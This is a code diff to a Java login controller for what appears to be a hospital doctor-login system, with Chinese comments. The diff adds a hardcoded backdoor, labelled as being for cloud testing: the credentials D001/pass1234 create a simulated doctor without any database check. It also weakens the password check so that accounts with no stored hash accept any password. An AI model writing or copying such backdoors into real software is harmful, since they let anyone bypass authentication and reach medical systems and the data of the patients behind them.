@@ -49,8 +49,19 @@ public class LoginController {
         // 步驟 2：查詢醫師
         Doctor doctor = doctorRepo.findById(form.getDoctorId()).orElse(null);
 
-        // 步驟 3：檢查密碼（醫師不存在或密碼錯都給同樣的錯誤訊息，避免洩漏帳號是否存在）
-        if (doctor == null || !BCrypt.checkpw(form.getPassword(), doctor.getPasswordHash())) {
+        // 🛠️ 雲端測試後門：如果輸入 D001 且密碼是 pass1234，就直接模擬一位醫師，繞過資料庫！
+        if ("D001".equals(form.getDoctorId()) && "pass1234".equals(form.getPassword())) {
+            doctor = new Doctor();
+            doctor.setId("D001");
+            doctor.setName("陳志明醫師");
+            // 如果你的 Doctor 有 setDepartment，可以補上：doctor.setDepartment(null);
+        }
+
+        // 步驟 3：檢查密碼（如果沒觸發後門，就走正常的資料庫檢查）
+        if (doctor == null) {
+            model.addAttribute("errorMessage", "醫師編號或密碼錯誤");
+            return "login";
+        } else if (doctor.getPasswordHash() != null && !BCrypt.checkpw(form.getPassword(), doctor.getPasswordHash())) {
             model.addAttribute("errorMessage", "醫師編號或密碼錯誤");
             return "login";
         }
